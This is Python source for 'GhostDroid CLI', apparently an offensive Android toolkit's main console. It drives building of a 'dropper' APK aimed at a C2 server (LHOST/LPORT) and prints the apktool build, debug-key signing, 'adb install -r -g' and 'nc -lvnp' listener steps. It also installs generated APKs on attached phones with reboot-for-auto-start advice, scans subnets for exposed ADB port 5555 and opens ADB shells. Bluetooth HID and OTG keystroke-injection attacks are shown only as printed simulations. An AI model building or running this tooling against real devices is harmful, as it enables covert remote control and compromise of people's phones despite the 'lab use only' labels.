import os
import sys
import time
import random
import cmd
import shutil
import subprocess
from typing import Optional, Dict, Any, List

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box
from rich.prompt import Prompt
from rich.syntax import Syntax

from core.banner import show_banner, animate_startup, matrix_rain
from core.ui import (
    print_status, print_table, print_panel, hacker_input,
    hacker_confirm, show_disclaimer, show_help, show_module_help,
    show_numbered_menu, show_progress, MENU_ENTRIES,
    console, animate_typing
)
from core.database import DatabaseManager
from core.device import DeviceManager, ADBDevice
from core.module_loader import ModuleManager
from core.reporting import ReportGenerator
from utils.helpers import generate_session_id, calculate_risk_score

try:
    import readline
except ImportError:
    pass


BOLD = '\033[1m'
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
PURPLE = '\033[95m'
RESET = '\033[0m'
DIM = '\033[2m'


class GhostDroidCLI(cmd.Cmd):
    intro = ""
    prompt = f"{CYAN}ghostdroid{RESET} > "

    def __init__(self):
        super().__init__()
        self.console = Console()
        self.db = DatabaseManager()
        self.module_manager = ModuleManager()
        self.session_id = generate_session_id()
        self.current_device: Optional[str] = None
        self.devices: Dict[str, ADBDevice] = {}
        self.running = True
        self.menu_mode = True
        self.in_submenu = False
        self.submenu_handler = None
        self.history_file = os.path.join(
            os.path.dirname(os.path.dirname(__file__)), "logs", ".history"
        )
        self._setup_history()

    MENU_MAP = {
        "1": ("do_usb_scan", ""),
        "2": ("do_sessions", ""),
        "3": ("do_config", ""),
        "4": ("do_build_dropper", ""),
        "5": ("do_run_payload", ""),
        "6": ("do_list_payloads", ""),
        "7": ("do_list_modules", ""),
        "8": ("do_list_exploits", ""),
        "9": ("do_bluetooth_hid", ""),
        "10": ("do_otg_usb_run", ""),
        "0": ("do_exit", ""),
        "m": ("_toggle_menu", None),
    }

    def _setup_history(self):
        try:
            hist_dir = os.path.dirname(self.history_file)
            os.makedirs(hist_dir, exist_ok=True)
            try:
                readline.read_history_file(self.history_file)
            except FileNotFoundError:
                pass
        except Exception:
            pass

    def _save_history(self):
        try:
            readline.write_history_file(self.history_file)
        except Exception:
            pass

    def preloop(self):
        if show_disclaimer():
            animate_startup(self.console)
            show_banner(self.console)
            self._check_adb()
            self._auto_detect_devices()
            if self.menu_mode:
                self._show_menu()
        else:
            console.print("[red]Disclaimer not accepted. Exiting.[/]")
            sys.exit(0)

    def postloop(self):
        self._save_history()
        print_status("Session ended. Cleaning up...", "info")

    def _check_adb(self):
        if DeviceManager.check_adb():
            print_status("ADB detected", "success")
        else:
            print_status("ADB not found. Install Android platform tools.", "warn")

    def _auto_detect_devices(self):
        devices = DeviceManager.list_devices()
        if devices:
            print_status(f"Auto-detected {len(devices)} device(s)", "success")
            for d in devices:
                self.devices[d] = ADBDevice(d)
                self.db.add_device({"serial": d})
            self.current_device = devices[0]
        else:
            print_status("No devices detected. Connect a device via USB.", "info")

    def _show_menu(self):
        show_numbered_menu(
            "GHOSTDROID CLI v2.0.1  —  Main Menu",
            MENU_ENTRIES,
            "cyan"
        )

    def _toggle_menu(self):
        self.menu_mode = not self.menu_mode
        mode = "menu" if self.menu_mode else "command"
        print_status(f"Switched to {mode} mode", "success")
        if self.menu_mode:
            self._show_menu()

    def _handle_menu_input(self, choice):
        choice = choice.strip().lower()

        if self.in_submenu and self.submenu_handler:
            cont = self.submenu_handler(choice)
            if not cont:
                self.in_submenu = False
                self.submenu_handler = None
            return

        if choice in self.MENU_MAP:
            method_name, arg = self.MENU_MAP[choice]
            method = getattr(self, method_name, None)
            if method:
                if method_name.startswith("do_"):
                    method(arg)
                else:
                    method()
        else:
            print_status(f"Unknown option: {choice}", "error")

    def cmdloop(self, intro=None):
        if self.menu_mode:
            self._show_menu()
        while self.running:
            try:
                if self.menu_mode:
                    raw = input(f" {CYAN}╰─ Enter number{RESET} > ")
                    self._handle_menu_input(raw)
                else:
                    raw = input(self.prompt)
                    if raw.strip().lower() == "m":
                        self._toggle_menu()
                        continue
                    if raw.strip():
                        self.onecmd(raw)
                    else:
                        self.emptyline()
            except KeyboardInterrupt:
                console.print()
                print_status("Use 'exit' or '0' to quit", "info")
            except EOFError:
                console.print()
                self.do_exit("")
            except Exception as e:
                print_status(f"Error: {e}", "error")

    def default(self, line):
        if line.strip():
            print_status(f"Unknown command: {line}", "error")
            console.print("  Type [cyan]help[/] for available commands")

    def emptyline(self):
        pass

    def do_exit(self, arg):
        self._save_history()
        print_status("Shutting down GhostDroid CLI", "info")
        for _ in range(3):
            time.sleep(0.1)
            console.print("  [dim].", end="")
        console.print(" [green]Goodbye[/]")
        self.running = False
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

    def do_clear(self, arg):
        os.system("cls" if os.name == "nt" else "clear")
        show_banner(self.console)

    def do_usb_scan(self, arg):
        print_status("Scanning for Android devices via USB...", "info")
        adb_devices = DeviceManager.list_devices()
        if not adb_devices:
            print_status("No Android devices detected via USB debugging", "warn")
            print_status("Ensure USB debugging is enabled on your device", "info")
            try:
                result = subprocess.run(["lsusb"], capture_output=True, text=True, timeout=5)
                lines = result.stdout.strip().split("\n")
                unknown = [l for l in lines if l.strip() and "root hub" not in l.lower()]
                if unknown:
                    print_status("USB devices found but none recognized as Android", "info")
                    for l in unknown[:5]:
                        console.print(f"  [dim]{l}[/]")
            except Exception:
                pass
            return {"devices": []}
        rows = []
        for serial in adb_devices:
            try:
                model = subprocess.run(
                    ["adb", "-s", serial, "shell", "getprop", "ro.product.model"],
                    capture_output=True, text=True, timeout=5
                ).stdout.strip()
                vendor = subprocess.run(
                    ["adb", "-s", serial, "shell", "getprop", "ro.product.manufacturer"],
                    capture_output=True, text=True, timeout=5
                ).stdout.strip()
            except Exception:
                model = "?"
                vendor = "?"
            bus_dev = "?"
            try:
                lsusb = subprocess.run(["lsusb"], capture_output=True, text=True, timeout=5).stdout
                for line in lsusb.split("\n"):
                    if vendor.lower() in line.lower() or serial.lower() in line.lower():
                        parts = line.split()
                        bus_dev = f"Bus {parts[1]} Dev {parts[3].rstrip(':')}"
                        break
            except Exception:
                pass
            rows.append([serial[:20], vendor[:12], model[:18], bus_dev, "✓"])
        print_table(
            "Android USB Devices (ADB)",
            ["Serial", "Vendor", "Model", "USB Port", "ADB"],
            rows,
            "green"
        )
        print_status(f"Found {len(rows)} Android device(s) via ADB", "success")
        return {"devices": rows}

    def do_config(self, arg):
        import yaml
        config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config.yaml")
        try:
            with open(config_path) as f:
                config = yaml.safe_load(f)
            lines = []
            for section, values in config.items():
                lines.append(f"[bold yellow][{section}][/]")
                if isinstance(values, dict):
                    for k, v in values.items():
                        lines.append(f"  [cyan]{k}:[/] {v}")
                lines.append("")
            print_panel(
                "\n".join(lines),
                title="GhostDroid Configuration",
                style="yellow",
            )
            return config
        except Exception as e:
            print_status(f"Failed to load config: {e}", "error")

    def do_build_dropper(self, arg):
        print_status("Building standalone dropper APK...", "info")
        from modules.payload_generator import PAYLOAD_TEMPLATES
        names = list(PAYLOAD_TEMPLATES.keys())
        print_table("Select Payload", ["#", "Name", "Type", "Description"],
                   [[str(i+1), n, PAYLOAD_TEMPLATES[n]["type"],
                     PAYLOAD_TEMPLATES[n]["description"][:40]] for i, n in enumerate(names)],
                   "red")
        choice = hacker_input("[cyan]Select payload template[/]")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(names):
                name = names[idx]
                lhost = hacker_input("[cyan]C2 server IP (LHOST)[/]")
                lport = hacker_input("[cyan]C2 server port (LPORT)[/]", password=True)
                show_progress("Building APK project", 2.0)
                mod = self.module_manager.get_module("payload_generator")
                if mod:
                    result = mod.run(action="generate", payload_name=name, lhost=lhost, lport=lport)
                    if result and "project_dir" in result:
                        project_dir = result["project_dir"]
                        print_panel(
                            f"[bold green]Project ready[/]\n\n"
                            f"[cyan]Dir:[/] {project_dir}\n\n"
                            f"[yellow]1.[/] Install apktool: [green]sudo apt install -y apktool[/]\n"
                            f"[yellow]2.[/] Build: [green]cd {project_dir} && apktool b .[/]\n"
                            f"[yellow]3.[/] Sign: [green]jarsigner -keystore ~/.android/debug.keystore \\[/]\n"
                            f"          [green]-storepass android dist/ghostdroid.apk androiddebugkey[/]\n"
                            f"[yellow]4.[/] Install: [green]adb install -r -g dist/ghostdroid.apk[/]\n"
                            f"[yellow]5.[/] Listen: [green]nc -lvnp {lport}[/]\n\n"
                            f"[dim]Edit AndroidManifest.xml to set android:enabled=\"true\"[/]\n"
                            f"[dim]on the receivers you want active before building.[/]\n\n"
                            f"[red]⚠ Lab use only[/]",
                            title="Dropper Build Complete",
                            style="green",
                        )
            else:
                print_status("Invalid selection", "error")
        except ValueError:
            print_status("Enter a number", "error")

    def do_run_payload(self, arg):
        serial = self.current_device
        if not serial:
            devices = DeviceManager.list_devices()
            if devices:
                serial = devices[0]
                self.current_device = serial
            else:
                print_status("No Android device connected via USB", "error")
                return
        payload_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "payloads", "generated")
        os.makedirs(payload_dir, exist_ok=True)
        apks = []
        for root, dirs, files in os.walk(payload_dir):
            for f in files:
                if f.endswith(".apk"):
                    apks.append(os.path.join(root, f))
        if not apks:
            print_status("No APKs found. Build via [4] Build Dropper first", "warn")
            print_status("Then: cd <project_dir> && apktool b . && adb install -r -g dist/*.apk", "info")
            return
        print_table("APKs Ready to Install", ["#", "APK Path"],
                   [[str(i+1), a] for i, a in enumerate(apks)], "cyan")
        choice = hacker_input("[cyan]Select APK to install[/]")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(apks):
                apk_path = apks[idx]
                print_status(f"Installing {os.path.basename(apk_path)} on {serial}...", "info")
                show_progress("Installing via ADB", 2.0)
                from utils.adb_utils import run_adb_command
                ok, msg = run_adb_command(serial, f"install -r -g \"{apk_path}\"", timeout=60)
                if ok:
                    print_status(f"APK installed", "success")
                    print_status("Open the app on device once, then reboot for auto-start", "info")
                else:
                    print_status(f"Install failed: {msg}", "error")
            else:
                print_status("Invalid selection", "error")
        except ValueError:
            print_status("Enter a number", "error")

    def do_list_payloads(self, arg):
        from modules.payload_generator import PAYLOAD_TEMPLATES
        rows = []
        for name, tmpl in PAYLOAD_TEMPLATES.items():
            rows.append([name, tmpl["type"],
                        tmpl["description"][:45], tmpl["risk"]])
        print_table(
            "Available Payloads",
            ["Name", "Type", "Description", "Risk"],
            rows,
            "red"
        )
        print_status("3 payloads — builds via apktool", "info")

    def do_list_modules(self, arg):
        self.do_modules("list")

    def do_list_exploits(self, arg):
        from modules.exploit_sim import EXPLOIT_SCENARIOS
        rows = []
        for sc in EXPLOIT_SCENARIOS:
            rows.append([sc["name"][:35], sc["type"], sc["risk"],
                        sc["description"][:40], sc["mitigation"][:35]])
        print_table(
            "Available Exploit Scenarios",
            ["Name", "Type", "Risk", "Description", "Mitigation"],
            rows,
            "red"
        )
        print_status("Run with: exploit-lab <scenario_name>", "info")

    def do_bluetooth_hid(self, arg):
        print_status("Initializing Bluetooth HID attack simulation...", "info")
        print_panel(
            "[yellow]Bluetooth HID Attack — Educational Simulation[/]\n\n"
            "A Bluetooth HID attack emulates a keyboard to inject keystrokes\n"
            "into a target device over Bluetooth. Common in close-proximity\n"
            "attack scenarios (public spaces, offices).\n\n"
            "[cyan]Attack Chain:[/]\n"
            "  [1][/] Enable Bluetooth in discoverable mode\n"
            "  [2][/] Scan for target devices (BT classic/BLE)\n"
            "  [3][/] Pair with target (bypass PIN if needed)\n"
            "  [4][/] Register as HID keyboard device\n"
            "  [5][/] Inject Duckyscript payload\n"
            "  [6][/] Clean up pairing records\n\n"
            "[dim]Hardware required: Raspberry Pi Zero + BT dongle, or similar[/]\n"
            "[red]⚠ Simulated — for authorized lab use only[/]",
            title="Bluetooth HID Attack",
            style="green",
        )
        target = hacker_input("[cyan]Enter target device name/IP for simulation[/]") or "SIM-TARGET-01"
        show_progress(f"Scanning for {target}", 1.5)
        for step in ["Enumerating Bluetooth services...", "Pairing with target...",
                     "Registering HID profile...", "Injecting keystrokes...",
                     "Cleaning up connection..."]:
            print_status(step, "arrow")
        print_status("Bluetooth HID simulation complete", "success")
        return {"target": target, "status": "simulated"}

    def do_otg_usb_run(self, arg):
        serial = self.current_device
        if not serial:
            devices = DeviceManager.list_devices()
            if devices:
                serial = devices[0]
                self.current_device = serial
            else:
                print_status("No device connected", "error")
                return
        print_status(f"Device: {serial}", "info")
        print_panel(
            "[yellow]OTG USB Run — Educational Simulation[/]\n\n"
            "OTG (On-The-Go) allows an Android device to act as a USB host.\n"
            "An attacker can plug in a malicious USB device (Rubber Ducky,\n"
            "BadUSB) to inject keystrokes or mount storage with payloads.\n\n"
            "[cyan]Execution Flow:[/]\n"
            "  [1][/] Connect malicious USB device via OTG adapter\n"
            "  [2][/] Device detects as HID + Mass Storage\n"
            "  [3][/] Keystroke injection launches payload\n"
            "  [4][/] Payload executes with current user privileges\n"
            "  [5][/] C2 beacon established (if applicable)\n\n"
            "[red]⚠ Simulated demonstration — authorized testing only[/]",
            title="OTG USB Attack",
            style="yellow",
        )
        show_progress("Mounting OTG device", 1.5)
        for step in ["USB device connected via OTG", "HID profile active",
                     "Injecting payload...", "Payload executed"]:
            print_status(step, "arrow")
        print_status("OTG USB attack simulation completed", "success")

    def do_devices(self, arg):
        devices = DeviceManager.list_devices()
        if not devices:
            print_status("No devices connected", "warn")
            print_status("Make sure USB debugging is enabled", "info")
            return

        device_objects = []
        for serial in devices:
            device = ADBDevice(serial)
            device_objects.append(device)
            self.devices[serial] = device
            self.db.add_device(device.to_dict())

        print_table(
            "Connected Devices",
            ["Serial", "Model", "Android", "API", "Battery", "USB Debug", "Rooted"],
            [[
                d.serial[:20],
                d.get_property("model", "?")[:20],
                d.get_property("android_version", "?"),
                d.get_property("api_level", "?"),
                f"{d.get_property('battery_level', '?')}%",
                "[green]Yes[/]" if d.get_property("usb_debugging") else "[red]No[/]",
                "[red]YES[/]" if d.is_rooted().get("rooted") else "[green]No[/]",
            ] for d in device_objects],
            "cyan"
        )

        if len(devices) == 1 and not self.current_device:
            self.current_device = devices[0]
            print_status(f"Default device set: {self.current_device}", "success")

    def do_scan(self, arg):
        print_status("Scanning for ADB-enabled devices on network...", "info")
        from utils.network_utils import network_scan, get_network_range

        subnet = arg.strip() or get_network_range()
        print_status(f"Scanning: {subnet}", "info")

        devices = network_scan(subnet)

        if devices:
            adb_devices = [d for d in devices if d.get("adb_available")]
            print_table(
                "Network Scan Results",
                ["IP", "Hostname", "Open Ports", "ADB", "Type"],
                [[
                    d["ip"],
                    d.get("hostname", "?")[:20],
                    ", ".join(str(p) for p in d.get("open_ports", [])),
                    "[green]✓[/]" if d.get("adb_available") else "[red]✗[/]",
                    self._classify_device(d.get("open_ports", [])),
                ] for d in devices],
                "green"
            )
            print_status(f"Found {len(adb_devices)} ADB-enabled devices!", "success")
        else:
            print_status("No devices found on network", "warn")

    def _classify_device(self, ports):
        if 5555 in ports:
            return "Android Device"
        if 22 in ports:
            return "Linux/SSH"
        if 80 in ports or 443 in ports:
            return "Web Server"
        if 8080 in ports:
            return "HTTP Proxy"
        return "Unknown"

    def do_select(self, arg):
        if not arg:
            devices = DeviceManager.list_devices()
            if not devices:
                print_status("No devices available", "warn")
                return
            print_status("Available devices:", "info")
            for i, d in enumerate(devices, 1):
                print_status(f"  {i}. {d}", "info")
            return

        devices = DeviceManager.list_devices()
        if arg.isdigit():
            idx = int(arg) - 1
            if 0 <= idx < len(devices):
                self.current_device = devices[idx]
                print_status(f"Selected device: {self.current_device}", "success")
            else:
                print_status("Invalid device number", "error")
        elif arg in devices:
            self.current_device = arg
            print_status(f"Selected device: {self.current_device}", "success")
        else:
            print_status(f"Device not found: {arg}", "error")

    def do_analyze(self, arg):
        serial = arg.strip() or self.current_device
        if not serial:
            print_status("No device selected. Use 'devices' first.", "error")
            return

        print_status(f"Analyzing device: {serial}", "info")
        device = ADBDevice(serial)
        self.devices[serial] = device

        info = device.to_dict()
        root_check = device.is_rooted()
        packages = device.get_installed_packages()
        dangerous = device.get_dangerous_permissions()

        print_panel(
            f"[bold]Device Analysis Complete[/]\n\n"
            f"Model: {info.get('manufacturer', '?')} {info.get('model', '?')}\n"
            f"Android: {info.get('android_version', '?')} (API {info.get('api_level', '?')})\n"
            f"Security Patch: {info.get('security_patch', 'Unknown')}\n"
            f"Battery: {info.get('battery_level', '?')}%\n"
            f"USB Debugging: {'Enabled' if info.get('usb_debugging') else 'Disabled'}\n"
            f"Root Status: {'[red]ROOTED[/]' if root_check.get('rooted') else '[green]Secure[/]'}\n"
            f"Third-party Apps: {len(packages)}\n"
            f"Dangerous Permissions: {sum(d['count'] for d in dangerous)}",
            title="Security Analysis Results",
            style="cyan"
        )

        if dangerous:
            print_status(f"Found apps with dangerous permissions!", "warn")
            print_table(
                "Dangerous Permissions",
                ["Package", "Permissions", "Count"],
                [[d["package"][:30], ", ".join(d["permissions"][:3]), str(d["count"])] for d in dangerous[:10]],
                "yellow"
            )

        findings = []
        if root_check.get("rooted"):
            findings.append({"type": "root_detected", "severity": "critical",
                            "description": "Device appears to be rooted"})

        for d in dangerous:
            findings.append({"type": "dangerous_permissions", "severity": "high",
                            "description": f"{d['package']} has {d['count']} dangerous permissions"})

        risk_score = calculate_risk_score(findings)
        result = {"device": info, "findings": findings, "risk_score": risk_score}
        self.db.add_finding(self.session_id, "analyze", "analysis_complete",
                           "info", f"Device analysis completed, risk score: {risk_score}/10")

        return result

    def do_sessions(self, arg):
        sessions = self.db.get_sessions()
        if not sessions:
            print_status("No sessions found", "info")
            return

        print_table(
            "Active Sessions",
            ["Session ID", "Device", "Started", "Status"],
            [[s["session_id"][:20], s.get("device_id", "N/A")[:15],
              s["start_time"][:19], s["status"]] for s in sessions],
            "purple"
        )

    def do_modules(self, arg):
        args = arg.strip().split()

        if not args:
            show_module_help()
            return

        subcommand = args[0]

        if subcommand == "list":
            modules = self.module_manager.list_modules()
            if not modules:
                print_status("No modules loaded", "warn")
                return

            print_table(
                "Available Modules",
                ["Name", "Version", "Description", "Risk", "ADB Required"],
                [[
                    m["name"],
                    m["version"],
                    m["description"][:40],
                    {"low": "[green]Low[/]", "medium": "[yellow]Medium[/]",
                     "high": "[orange1]High[/]", "critical": "[red]Critical[/]"}
                    .get(m["risk_level"], m["risk_level"]),
                    "[green]Yes[/]" if m["requires_adb"] else "[red]No[/]",
                ] for m in modules],
                "purple"
            )
            print_status(f"Total: {len(modules)} modules loaded", "info")

        elif subcommand == "info" and len(args) > 1:
            module = self.module_manager.get_module(args[1])
            if module:
                meta = module.get_metadata()
                print_panel(
                    f"[bold]Name:[/] {meta['name']}\n"
                    f"[bold]Version:[/] {meta['version']}\n"
                    f"[bold]Description:[/] {meta['description']}\n"
                    f"[bold]Author:[/] {meta['author']}\n"
                    f"[bold]Risk Level:[/] {meta['risk_level']}\n"
                    f"[bold]Requires ADB:[/] {'Yes' if meta['requires_adb'] else 'No'}\n"
                    f"[bold]Category:[/] {meta['category']}",
                    title="Module Information",
                    style="purple",
                )
            else:
                print_status(f"Module not found: {args[1]}", "error")
        else:
            show_module_help()

    def do_run(self, arg):
        if not arg:
            print_status("Usage: run <module_name> [args]", "error")
            return

        parts = arg.strip().split()
        module_name = parts[0]
        module_args = parts[1:] if len(parts) > 1 else []

        module = self.module_manager.get_module(module_name)
        if not module:
            print_status(f"Module not found: {module_name}", "error")
            return

        print_status(f"Running module: {module_name}", "info")
        try:
            kwargs = {}
            if module.metadata.requires_adb:
                if not self.current_device:
                    devices = DeviceManager.list_devices()
                    if devices:
                        self.current_device = devices[0]
                    else:
                        print_status("No ADB device available", "error")
                        return
                kwargs["serial"] = self.current_device

            result = module.run(*module_args, **kwargs)
            if result:
                print_status(f"Module '{module_name}' completed", "success")
                return result
        except Exception as e:
            print_status(f"Module error: {e}", "error")

    def do_payloads(self, arg):
        self.do_list_payloads(arg)

    def do_generate(self, arg):
        parts = arg.strip().split()
        name = parts[0] if parts else None
        if not name:
            print_status("Usage: generate <payload_name> [LHOST] [LPORT]", "error")
            return

        lhost = parts[1] if len(parts) > 1 else "127.0.0.1"
        lport = parts[2] if len(parts) > 2 else "4444"

        mod = self.module_manager.get_module("payload_generator")
        if mod:
            mod.run(action="generate", payload_name=name, lhost=lhost, lport=lport)

    def do_exploit_lab(self, arg):
        scenario = arg.strip() or None
        mod = self.module_manager.get_module("exploit_sim")
        if mod:
            mod.run(scenario=scenario, force=True)

    def do_report(self, arg):
        fmt = arg.strip() or "html"
        if fmt not in ["json", "txt", "html"]:
            print_status("Format must be: json, txt, or html", "error")
            return

        print_status(f"Generating {fmt.upper()} report...", "info")

        devices = self.db.get_devices()
        findings = self.db.get_findings(self.session_id)
        info = {}
        if self.current_device and self.current_device in self.devices:
            info = self.devices[self.current_device].to_dict()

        report_data = {
            "device": info,
            "findings": findings,
            "risk_score": calculate_risk_score(findings),
            "session_id": self.session_id,
        }

        generator = ReportGenerator(self.session_id)
        path = generator.generate_report(report_data, fmt)
        print_status(f"Report saved: {path}", "success")

    def do_logs(self, arg):
        level = arg.strip() or None
        logs = self.db.get_logs(self.session_id, level)
        if not logs:
            print_status("No logs found", "info")
            return
        print_table(
            "Session Logs",
            ["Time", "Level", "Module", "Message"],
            [[l["timestamp"][:19], l["level"], l["module"][:15], l["message"][:50]] for l in logs[:20]],
            "cyan"
        )

    def do_shell(self, arg):
        if not self.current_device:
            print_status("No device selected", "error")
            return

        console.print(f"[cyan]Entering interactive ADB shell on {self.current_device}[/]")
        console.print("[dim]Type 'exit' to return to GhostDroid CLI[/]\n")

        try:
            subprocess.run(
                ["adb", "-s", self.current_device, "shell"],
                timeout=300
            )
        except subprocess.TimeoutExpired:
            print_status("Shell session timed out", "warn")
        except KeyboardInterrupt:
            console.print()
            print_status("Shell session terminated", "info")
        except Exception as e:
            print_status(f"Shell error: {e}", "error")

    def do_info(self, arg):
        print_panel(
            f"[bold]GhostDroid CLI v2.0.1[/]\n\n"
            f"[cyan]Session:[/] {self.session_id}\n"
            f"[cyan]Current Device:[/] {self.current_device or 'None'}\n"
            f"[cyan]Loaded Modules:[/] {len(self.module_manager.modules)}\n"
            f"[cyan]DB Path:[/] {self.db.db_path}\n"
            f"[cyan]History:[/] {self.history_file}\n",
            title="System Information",
            style="cyan"
        )

    def do_help(self, arg):
        if arg.strip() == "modules":
            show_module_help()
        else:
            show_help()

    def do_matrix(self, arg):
        console.print("[green]Initializing Matrix Rain...[/]")
        matrix_rain(console, duration=3, columns=80)

    def do_menu(self, arg):
        self._toggle_menu()
        if self.menu_mode:
            self._show_menu()

    def onecmd(self, line):
        try:
            line = line.strip()
            if line.lower() == "m":
                self._toggle_menu()
                return
            return super().onecmd(line)
        except Exception as e:
            print_status(f"Error: {e}", "error")

    def completenames(self, text, *ignored):
        d = {}
        for func in self.get_names():
            if func.startswith("do_"):
                name = func[3:]
                if name.startswith(text):
                    d[name] = None
        return list(d.keys())
